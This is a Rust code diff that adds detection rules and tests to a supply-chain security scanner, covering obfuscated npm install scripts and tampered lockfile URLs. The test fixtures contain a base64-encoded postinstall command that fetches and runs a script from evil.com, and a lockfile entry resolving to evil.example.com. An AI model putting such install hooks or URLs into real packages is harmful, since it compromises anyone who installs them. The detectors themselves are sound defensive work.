@@ -569,6 +569,56 @@ impl L2Evaluator for SupplyChainEvaluator {
             });
         }
 
+        // Base64-decoded command execution in npm lifecycle scripts
+        static SUPPLY_OBFUSCATED_INSTALL_SCRIPT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r#"(?is)(?:"(?:preinstall|postinstall|install|prepare)"\s*:\s*"[^"]*(?:base64\s+-d|eval\s*\$\(|node\s+-e\s*["']require\(["']child_process|python[23]?\s+-c\s*["']import\s+os|perl\s+-e)[^"]*")"#).unwrap()
+        });
+        if let Some(m) = SUPPLY_OBFUSCATED_INSTALL_SCRIPT_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "supply_obfuscated_install_script".into(),
+                confidence: 0.93,
+                detail: "Base64-decoded command execution in npm lifecycle scripts".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "npm lifecycle scripts (preinstall, postinstall) with base64-decoded payloads or eval($()) patterns hide malicious commands from initial inspection. Attackers encode curl evil.com|sh as base64 to bypass simple keyword scanning".into(),
+                    offset: m.start(),
+                    property: "npm lifecycle scripts must be reviewed for any command execution patterns. base64 -d, eval, and network fetch patterns in install scripts must be flagged for security review".into(),
+                }],
+            });
+        }
+
+        // Lockfile resolved URLs pointing to attacker-controlled locations
+        // Original Pattern: r"(?is)\"resolved\"\s*:\s*\"(?:git\+(?:ssh|https?)://|https?://[^/\"]*@[^\"]*|http://(?!(?:registry\.npmjs\.org|pypi\.org|files\.pythonhosted\.org|rubygems\.org))[^\"]+)"
+        static SUPPLY_LOCKFILE_URL_TAMPER_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r#"(?is)"resolved"\s*:\s*"(?:git\+(?:ssh|https?)://|https?://[^/"]*@[^"]*|http://[^"]+)"#).unwrap()
+        });
+        if let Some(m) = SUPPLY_LOCKFILE_URL_TAMPER_RE.find(&decoded) {
+            let s = m.as_str();
+            let mut is_match = true;
+            if s.contains("http://") && !s.contains("git+") && !s.contains("@") {
+                if s.contains("registry.npmjs.org") || s.contains("pypi.org") || s.contains("files.pythonhosted.org") || s.contains("rubygems.org") {
+                    is_match = false;
+                }
+            }
+            if is_match {
+                dets.push(L2Detection {
+                    detection_type: "supply_lockfile_url_tamper".into(),
+                    confidence: 0.89,
+                    detail: "Lockfile resolved URLs pointing to attacker-controlled locations".into(),
+                    position: m.start(),
+                    evidence: vec![ProofEvidence {
+                        operation: EvidenceOperation::PayloadInject,
+                        matched_input: m.as_str().to_owned(),
+                        interpretation: "Lockfile resolved: URLs that use git+ssh, contain credentials (@), or use HTTP to non-canonical registries indicate supply chain tampering. Attackers replace legitimate package URLs with malicious mirrors".into(),
+                        offset: m.start(),
+                        property: "Package lockfiles must only reference canonical registry URLs. Any custom resolved URLs must be reviewed. CI/CD must verify lockfile integrity via checksums".into(),
+                    }],
+                });
+            }
+        }
+
         dets
     }
 
@@ -578,8 +628,9 @@ impl L2Evaluator for SupplyChainEvaluator {
             | "typosquatting"
             | "lockfile_poisoning"
             | "gitmodules_poisoning"
-            | "cargo_git_dep_injection" => Some(InvariantClass::DependencyConfusion),
-            "malicious_script" => Some(InvariantClass::PostinstallInjection),
+            | "cargo_git_dep_injection"
+            | "supply_lockfile_url_tamper" => Some(InvariantClass::DependencyConfusion),
+            "malicious_script" | "supply_obfuscated_install_script" => Some(InvariantClass::PostinstallInjection),
             "env_exfiltration" => Some(InvariantClass::EnvExfiltration),
             "cdn_integrity_bypass" | "github_actions_pwn_request" => {
                 Some(InvariantClass::PostinstallInjection)
@@ -752,6 +803,26 @@ fn is_third_party_cdn_host(host: &str) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn detects_supply_obfuscated_install_script() {
+        let eval = SupplyChainEvaluator;
+        let dets = eval.detect(r#"{"postinstall":"echo Y3VybCBldmlsLmNvbXxzaA== | base64 -d | sh"}"#);
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "supply_obfuscated_install_script")
+        );
+    }
+
+    #[test]
+    fn detects_supply_lockfile_url_tamper() {
+        let eval = SupplyChainEvaluator;
+        let dets = eval.detect(r#"{"resolved": "http://evil.example.com/pkg.tgz"}"#);
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "supply_lockfile_url_tamper")
+        );
+    }
 
     #[test]
     fn detects_public_registry_dependency_confusion() {
